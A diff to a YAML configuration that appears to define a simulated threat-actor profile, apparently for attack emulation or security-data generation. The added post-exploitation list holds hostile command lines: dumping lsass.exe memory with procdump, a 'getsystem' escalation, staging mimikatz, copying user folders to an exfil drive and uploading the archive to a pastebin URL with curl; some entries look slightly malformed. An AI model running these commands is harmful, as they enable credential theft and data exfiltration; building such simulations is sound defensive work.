@@ -7,6 +7,11 @@ attacks:
   - delivery:supply_chain
   - email:malware_delivery
   - watering_hole:malware_delivery
+watering_hole_domains:
+  - compedsupplychainwebsite.com
+watering_hole_target_roles:
+  - Finance associate
+  - CEO
 domain_themes:
   - software
   - update
@@ -54,8 +59,24 @@ tlds:
 spoofs_email: False
 malware:
   - unhelpfuldesk
-watering_hole_domains:
-  - compedsupplychainwebsite.com
-watering_hole_target_roles:
-  - Finance associate
-  - CEO
+post_exploit_commands:
+  - name: cmd.exe
+    process: ipconfigg
+  - name: cmd.exe
+    process: "C:\\programdata\\procdump64.exe -accepteula -ma lsass.exe C:\\ProgramData\\lsass.dmp"
+  - name: cmd.exe
+    process: "C:\\Windows\\system32\\cmd.exe /C getsystem"
+  - name: procdump64.exe
+    process: "C:\\programdata\\procdump64.exe -accepteula -ma lsass.exe C:\\ProgramData\\lsass.dmp"
+  - name: ipconfig.exe
+    process: "ipconfig /all"
+  - name: echo.exe
+    process: echo GET mimikatz.exe >> ftp.txt
+  - name: echo.exe
+    process: "copy C:\\Users\\Public\\Documents\\*  F:\\exfil\\Users\\"
+  - name: echo.exe
+    process: "copy C:\\Users\\Public\\Downloads\\*  F:\\exfil\\Users\\"
+  - name: echo.exe
+    process: "copy C:\\Users\\Public\\Research\\*  F:\\exfil\\Users\\"
+  - name: echo.exe
+    process: "curl F:\\exfil\\full.gz https://pastebin.com/mZ38bYLt:/NotCompanySecrets.gz"
